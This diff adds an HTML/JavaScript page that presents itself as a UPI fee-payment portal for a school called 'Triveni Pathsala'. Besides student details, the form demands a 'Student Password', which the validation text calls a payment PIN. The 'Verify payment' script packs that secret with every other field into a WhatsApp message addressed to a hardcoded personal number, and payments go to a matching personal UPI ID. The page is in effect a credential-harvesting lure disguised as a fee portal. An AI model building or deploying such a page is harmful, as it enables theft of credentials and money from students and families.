@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
+  <title>UPI Fee Portal | Smart Payment Hub</title>
+  <!-- Google Fonts + Tailwind + Font Awesome + QRCode Library -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+  <style>
+    * {
+      font-family: 'Inter', sans-serif;
+    }
+    body {
+      background: radial-gradient(circle at 10% 30%, #f0f4ff, #e2eafc);
+      min-height: 100vh;
+      padding: 1.25rem;
+    }
+    /* glassmorphic card */
+    .glass-panel {
+      background: rgba(255, 255, 255, 0.97);
+      backdrop-filter: blur(0px);
+      border-radius: 2rem;
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.2), 0 1px 2px rgba(0,0,0,0.03);
+      transition: transform 0.25s ease, box-shadow 0.3s ease;
+    }
+    .glass-panel:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 30px 50px -16px rgba(0, 0, 0, 0.25);
+    }
+    .input-fresh {
+      transition: all 0.2s;
+      border: 1.5px solid #e9eef3;
+      background: #ffffff;
+      border-radius: 1.2rem;
+      padding: 0.75rem 1rem;
+      font-weight: 500;
+      font-size: 0.95rem;
+    }
+    .input-fresh:focus {
+      border-color: #4f46e5;
+      box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2);
+      outline: none;
+      transform: scale(1.01);
+    }
+    .btn-ani {
+      transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      transform: translateY(0);
+    }
+    .btn-ani:active {
+      transform: scale(0.96);
+    }
+    .qr-box {
+      background: white;
+      padding: 1rem;
+      border-radius: 1.5rem;
+      box-shadow: 0 10px 20px -5px rgba(0, 0, 0, 0.08);
+      transition: 0.2s;
+    }
+    @keyframes gentleFadeUp {
+      0% { opacity: 0; transform: translateY(12px);}
+      100% { opacity: 1; transform: translateY(0px);}
+    }
+    .animate-up {
+      animation: gentleFadeUp 0.5s ease-out forwards;
+    }
+    .gpay-btn {
+      background: linear-gradient(135deg, #1a73e8, #0d5bbf);
+      color: white;
+    }
+    .phonepe-btn {
+      background: linear-gradient(135deg, #5f259f, #431d73);
+      color: white;
+    }
+    .paytm-btn {
+      background: linear-gradient(135deg, #00b9f2, #0096c7);
+      color: white;
+    }
+    .hover-glow-up:hover {
+      filter: brightness(1.05);
+      box-shadow: 0 10px 20px -5px rgba(0, 0, 0, 0.2);
+      transform: translateY(-1px);
+    }
+    .qr-placeholder {
+      min-height: 170px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    /* custom scroll */
+    ::-webkit-scrollbar {
+      width: 5px;
+    }
+  </style>
+</head>
+<body class="antialiased">
+
+  <div class="max-w-6xl mx-auto animate-up">
+    <!-- Header with badge -->
+    <div class="text-center mb-6 md:mb-8">
+      <div class="inline-flex items-center gap-2 bg-white/80 backdrop-blur-sm px-5 py-2 rounded-full shadow-sm text-sm font-bold text-indigo-800 mb-3 border border-indigo-100">
+        <i class="fas fa-bolt text-indigo-500"></i> <span>INSTANT UPI PAYMENT</span> <i class="fas fa-shield-alt text-green-600"></i>
+      </div>
+      <h1 class="text-3xl md:text-4xl font-extrabold tracking-tight bg-gradient-to-r from-indigo-900 to-sky-700 bg-clip-text text-transparent"> Triveni Pathsala </h1>
+      <p class="text-gray-600 mt-2 text-sm md:text-base font-medium"></p>
+    </div>
+
+    <!-- Two column grid (mobile first) -->
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 md:gap-8">
+      
+      <!-- LEFT: Student Information Form -->
+      <div class="glass-panel p-5 md:p-7 animate-up" style="animation-delay: 0.05s;">
+        <div class="flex items-center gap-2 border-b border-indigo-100 pb-3 mb-5">
+          <div class="bg-indigo-100 p-2 rounded-full"><i class="fas fa-user-edit text-indigo-700"></i></div>
+          <h2 class="text-xl font-bold text-gray-800">📋 Student details</h2>
+        </div>
+        
+        <div class="space-y-4">
+          <div>
+            <label class="block text-sm font-semibold text-gray-700 mb-1"><i class="fas fa-user-graduate mr-1 text-indigo-500"></i> Full name </label>
+            <input type="text" id="studentName" placeholder="e.g., Ananya Verma" class="input-fresh w-full" autocomplete="off">
+          </div>
+          <div>
+            <label class="block text-sm font-semibold text-gray-700 mb-1"><i class="fas fa-school mr-1 text-indigo-500"></i> Class </label>
+            <input type="text" id="studentClass" placeholder="e.g., 12 - B (Commerce)" class="input-fresh w-full">
+          </div>
+          <div>
+            <label class="block text-sm font-semibold text-gray-700 mb-1"><i class="fas fa-user-tie mr-1 text-indigo-500"></i> Father's name </label>
+            <input type="text" id="fatherName" placeholder="e.g., Rajesh Verma" class="input-fresh w-full">
+          </div>
+          <div>
+            <label class="block text-sm font-semibold text-gray-700 mb-1"><i class="fas fa-id-card mr-1 text-indigo-500"></i> Student ID </label>
+            <input type="text" id="studentId" placeholder="e.g., FE-2412-01" class="input-fresh w-full">
+          </div>
+          <div>
+            <label class="block text-sm font-semibold text-gray-700 mb-1"><i class="fas fa-lock mr-1 text-indigo-500"></i> Student Password</label>
+            <input type="password" id="password" placeholder="••••••" class="input-fresh w-full">
+          </div>
+          <div>
+            <label class="block text-sm font-semibold text-gray-700 mb-1"><i class="fas fa-rupee-sign mr-1 text-indigo-500"></i> Fee amount (₹) </label>
+            <input type="number" id="feeAmount" step="0.01" min="1" value="600.00" class="input-fresh w-full font-mono font-bold">
+          </div>
+        </div>
+        
+        <div class="mt-5 flex items-center gap-2 text-xs text-gray-400 border-t border-gray-100 pt-4">
+          <i class="fas fa- text-indigo-300"></i> <span></span>
+        </div>
+      </div>
+      
+      <!-- RIGHT: Payment Hub + QR + UPI buttons + Single Verify Button -->
+      <div class="glass-panel p-5 md:p-7 animate-up" style="animation-delay: 0.1s;">
+        <div class="flex flex-wrap items-center justify-between gap-2 border-b border-indigo-100 pb-3 mb-4">
+          <div class="flex items-center gap-2">
+            <i class="fab fa-google-pay text-indigo-600 text-xl"></i>
+            <h2 class="text-xl font-bold text-gray-800">Payment Gateway</h2>
+          </div>
+          <span class="bg-emerald-100 text-emerald-700 text-xs px-3 py-1 rounded-full font-semibold"><i class="fas fa-sync-alt"></i> </span>
+        </div>
+        
+        <!-- QR Code Section: dynamically linked to fee & hidden UPI ID -->
+        <div class="bg-indigo-50/30 rounded-2xl p-4 mb-5 transition-all">
+          <div class="flex justify-between items-center flex-wrap gap-2 mb-3">
+            <span class="font-bold text-gray-700 text-sm"><i class="fas fa-qrcode mr-1 text-indigo-600"></i> Scan & pay exact fee</span>
+            <span class="bg-white text-indigo-800 text-sm font-extrabold px-3 py-1 rounded-full shadow-sm border border-indigo-200"><i class="fas fa-indian-rupee-sign"></i> <span id="qrAmountPreview">2350.00</span></span>
+          </div>
+          <div id="qrCodeContainer" class="qr-box flex justify-center items-center qr-placeholder w-full">
+            <div id="qrcodeCanvas" class="flex justify-center"></div>
+          </div>
+          <p class="text-xs text-center text-gray-500 mt-2">QR includes merchant UPI ID + ₹<span id="qrAmountHint">2350.00</span> (auto‑updated)</p>
+        </div>
+        
+        <!-- Three Real UPI Payment Buttons (Google Pay, PhonePe, Paytm) direct redirect -->
+        <div class="grid grid-cols-3 gap-3 mb-6">
+          <button id="googlePayBtn" class="gpay-btn btn-ani rounded-xl py-3 flex flex-col items-center gap-1 font-semibold shadow-md hover-glow-up"><i class="fab fa-google-pay text-xl"></i><span class="text-sm">Google Pay</span></button>
+          <button id="phonePeBtn" class="phonepe-btn btn-ani rounded-xl py-3 flex flex-col items-center gap-1 font-semibold shadow-md hover-glow-up"><i class="fas fa-mobile-alt text-xl"></i><span class="text-sm">PhonePe</span></button>
+          <button id="paytmBtn" class="paytm-btn btn-ani rounded-xl py-3 flex flex-col items-center gap-1 font-semibold shadow-md hover-glow-up"><i class="fab fa-paypal text-xl"></i><span class="text-sm">Paytm</span></button>
+        </div>
+        
+        <!-- Combined Verification + WhatsApp Notification Button (Admin number hidden) -->
+        <div class="mt-3">
+          <button id="verifyAndSendBtn" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-bold py-3.5 rounded-xl btn-ani shadow-lg flex items-center justify-center gap-3 text-base transition-all">
+            <i class="fab f text-xl"></i> Verify payment
+            <i class="fas fa-arrow-right"></i>
+          </button>
+          <p class="text-[11px] text-center text-gray-400 mt-2 flex items-center justify-center gap-1"><i class="fas fa-lock"></i> Payment receipt + student data sent to admin instantly</p>
+        </div>
+        
+        <!-- small footnote -->
+        <div class="mt-5 text-center text-[10px] text-gray-400 border-t pt-3">
+          <i class="fas fa-"></i> 
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ======================= CONFIGURATION (EDIT BY CODE - HIDDEN FROM PREVIEW) =======================
+      // 🔒 MERCHANT UPI ID: Replace with your own UPI ID (e.g., "yourname@okhdfcbank")
+      const MERCHANT_UPI_ID = "6202320527@naviaxis";   // <-- CHANGE THIS TO YOUR UPI ID
+      
+      // 🔒 ADMIN WHATSAPP NUMBER (with country code, without '+' or with '+'? Use international format)
+      const ADMIN_WHATSAPP_NUMBER = "916202320527";        // <-- CHANGE THIS TO YOUR WHATSAPP NUMBER (e.g., 9198xxxxxx)
+      // Note: the number should be in international format without '+' (e.g., 919876543210)
+      // ================================================================================================
+      
+      // DOM Elements
+      const nameInput = document.getElementById('studentName');
+      const classInput = document.getElementById('studentClass');
+      const fatherInput = document.getElementById('fatherName');
+      const studentIdInput = document.getElementById('studentId');
+      const passwordInput = document.getElementById('password');
+      const feeInput = document.getElementById('feeAmount');
+      
+      const qrContainer = document.getElementById('qrcodeCanvas');
+      const qrAmountPreviewSpan = document.getElementById('qrAmountPreview');
+      const qrAmountHintSpan = document.getElementById('qrAmountHint');
+      
+      // Buttons
+      const googlePayBtn = document.getElementById('googlePayBtn');
+      const phonePeBtn = document.getElementById('phonePeBtn');
+      const paytmBtn = document.getElementById('paytmBtn');
+      const verifySendBtn = document.getElementById('verifyAndSendBtn');
+      
+      // Helper: get current fee amount as number
+      function getCurrentFee() {
+        let fee = parseFloat(feeInput.value);
+        if (isNaN(fee) || fee <= 0) return 0;
+        return fee;
+      }
+      
+      // Update amount displays
+      function updateAmountDisplays() {
+        let fee = getCurrentFee();
+        let formatted = fee.toFixed(2);
+        qrAmountPreviewSpan.innerText = formatted;
+        qrAmountHintSpan.innerText = formatted;
+      }
+      
+      // Build UPI deep link with current amount and hidden merchant UPI ID
+      function buildUpiPaymentLink() {
+        let amount = getCurrentFee();
+        if (!MERCHANT_UPI_ID || MERCHANT_UPI_ID.trim() === "") {
+          alert("⚠️ Payment error: Merchant UPI ID not configured. Please contact admin.");
+          return null;
+        }
+        if (amount <= 0) {
+          alert("⚠️ Fee amount must be greater than ₹0");
+          return null;
+        }
+        const payeeName = "CollegeFeePortal";
+        const description = `Fee-${Date.now()}`;
+        const upiLink = `upi://pay?pa=${encodeURIComponent(MERCHANT_UPI_ID)}&pn=${encodeURIComponent(payeeName)}&am=${amount.toFixed(2)}&cu=INR&tn=${encodeURIComponent(description)}`;
+        return upiLink;
+      }
+      
+      // Regenerate QR code using hidden UPI ID + current fee amount
+      function regenerateQR() {
+        const amount = getCurrentFee();
+        if (!MERCHANT_UPI_ID || MERCHANT_UPI_ID.trim() === "") {
+          qrContainer.innerHTML = `<div class="text-center text-red-500 text-sm p-3"><i class="fas fa-ban"></i> UPI ID missing (config error)</div>`;
+          return;
+        }
+        if (amount <= 0) {
+          qrContainer.innerHTML = `<div class="text-center text-amber-600 text-sm p-3"><i class="fas fa-exclamation-triangle"></i> Enter valid fee amount > ₹0</div>`;
+          return;
+        }
+        
+        // Build UPI string for QR
+        const upiQRString = `upi://pay?pa=${encodeURIComponent(MERCHANT_UPI_ID)}&pn=Fee%20Payment&am=${amount.toFixed(2)}&cu=INR`;
+        qrContainer.innerHTML = ''; // clear previous content
+        try {
+          new QRCode(qrContainer, {
+            text: upiQRString,
+            width: 170,
+            height: 170,
+            colorDark: "#0f172a",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.M
+          });
+        } catch (err) {
+          console.warn(err);
+          qrContainer.innerHTML = `<div class="text-red-400 text-xs text-center">QR generation failed, refresh</div>`;
+        }
+      }
+      
+      // Refresh whole payment UI (amount + QR)
+      function refreshPaymentUI() {
+        updateAmountDisplays();
+        regenerateQR();
+      }
+      
+      // Event listeners: fee amount change triggers QR update
+      feeInput.addEventListener('input', () => {
+        refreshPaymentUI();
+      });
+      
+      // ---------- DIRECT UPI REDIRECT (Google Pay, PhonePe, Paytm) ----------
+      function redirectToUPIApp() {
+        const upiLink = buildUpiPaymentLink();
+        if (upiLink) {
+          window.location.href = upiLink;
+          // fallback for desktop / no app
+          setTimeout(() => {
+            alert("If no app opens, please ensure you have Google Pay, PhonePe, or Paytm installed on your mobile device.");
+          }, 600);
+        }
+      }
+      
+      googlePayBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        redirectToUPIApp();
+      });
+      phonePeBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        redirectToUPIApp();
+      });
+      paytmBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        redirectToUPIApp();
+      });
+      
+      // ---------- VERIFY + SEND PAYMENT DETAILS TO HIDDEN WHATSAPP NUMBER ----------
+      // This function validates all fields, collects data, and sends via WhatsApp using hidden admin number
+      function validateAndSendToWhatsApp() {
+        // get all student fields
+        const studentName = nameInput.value.trim();
+        const studentClass = classInput.value.trim();
+        const fatherName = fatherInput.value.trim();
+        const studentId = studentIdInput.value.trim();
+        const passwordVal = passwordInput.value.trim();
+        const feeAmount = getCurrentFee();
+        
+        // validation
+        if (!studentName) {
+          alert("❌ Please enter student's full name.");
+          nameInput.focus();
+          return false;
+        }
+        if (!studentClass) {
+          alert("❌ Please enter class/grade.");
+          classInput.focus();
+          return false;
+        }
+        if (!fatherName) {
+          alert("❌ Please enter father's name.");
+          fatherInput.focus();
+          return false;
+        }
+        if (!studentId) {
+          alert("❌ Please enter student ID.");
+          studentIdInput.focus();
+          return false;
+        }
+        if (!passwordVal) {
+          alert("❌ Please enter payment PIN / password.");
+          passwordInput.focus();
+          return false;
+        }
+        if (feeAmount <= 0) {
+          alert("❌ Fee amount must be greater than ₹0.");
+          feeInput.focus();
+          return false;
+        }
+        if (!MERCHANT_UPI_ID || MERCHANT_UPI_ID.trim() === "") {
+          alert("⚠️ Internal error: Merchant UPI ID missing. Please contact support.");
+          return false;
+        }
+        
+        // Format WhatsApp number (ensure no '+' and valid)
+        let whatsappNum = ADMIN_WHATSAPP_NUMBER.replace(/\s+/g, '');
+        if (!whatsappNum.match(/^[0-9]{8,15}$/)) {
+          // if includes '+' strip it
+          whatsappNum = whatsappNum.replace(/^\+/, '');
+          if (!whatsappNum.match(/^[0-9]{8,15}$/)) {
+            alert("⚠️ Admin WhatsApp number not properly configured. Please contact site admin.");
+            return false;
+          }
+        }
+        
+        // Build rich professional message with payment info & timestamp
+        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
+        const message = `🏷️ *FEE PAYMENT VERIFICATION* 🏷️\n\n` +
+                        `👤 *Student:* ${studentName}\n` +
+                        `📚 *Class:* ${studentClass}\n` +
+                        `👨‍👧 *Father's Name:* ${fatherName}\n` +
+                        `🆔 *Student ID:* ${studentId}\n` +
+                        `🔐 *Secure PIN:* ${passwordVal}\n` +
+                        `💰 *Fee Amount:* ₹${feeAmount.toFixed(2)}\n` +
+                        `🏦 *Merchant UPI ID:* ${MERCHANT_UPI_ID}\n` +
+                        `⏱️ *Request Time:* ${timestamp}\n` +
+                        `✅ *Action:* Student initiated payment via QR / UPI buttons.\n` +
+                        `📲 *Status:* Awaiting confirmation. Verify transaction in UPI app.`;
+        
+        const encodedMsg = encodeURIComponent(message);
+        const waLink = `https://wa.me/${whatsappNum}?text=${encodedMsg}`;
+        
+        // Open WhatsApp (works on mobile & desktop web)
+        window.open(waLink, '_blank');
+        
+        // Provide visual feedback on button
+        const originalText = verifySendBtn.innerHTML;
+        verifySendBtn.innerHTML = '<i class="fas fa-check-circle"></i> Details Sent! Redirecting...';
+        setTimeout(() => {
+          verifySendBtn.innerHTML = originalText;
+        }, 2500);
+        
+        return true;
+      }
+      
+      verifySendBtn.addEventListener('click', () => {
+        validateAndSendToWhatsApp();
+      });
+      
+      // Additional real-time validation: ensure fee is positive on blur
+      feeInput.addEventListener('blur', () => {
+        let fee = getCurrentFee();
+        if (fee <= 0) {
+          feeInput.value = 1.00;
+          refreshPaymentUI();
+        } else {
+          refreshPaymentUI();
+        }
+      });
+      
+      // Initial QR generation and amount sync
+      refreshPaymentUI();
+      
+      // Optional: provide placeholder hints for demo, but not override user intent
+      if (!nameInput.value) nameInput.placeholder = "e.g., your name";
+      if (!classInput.value) classInput.placeholder = "";
+      if (!fatherName.value) fatherName.placeholder = "";
+      if (!studentIdInput.value) studentIdInput.placeholder = "";
+      
+      // small console note (developer only)
+      console.log("✅ UPI Mode active | Merchant UPI:", MERCHANT_UPI_ID, "| Admin WhatsApp:", ADMIN_WHATSAPP_NUMBER);
+    })();
+  </script>
+</body>
+</html>
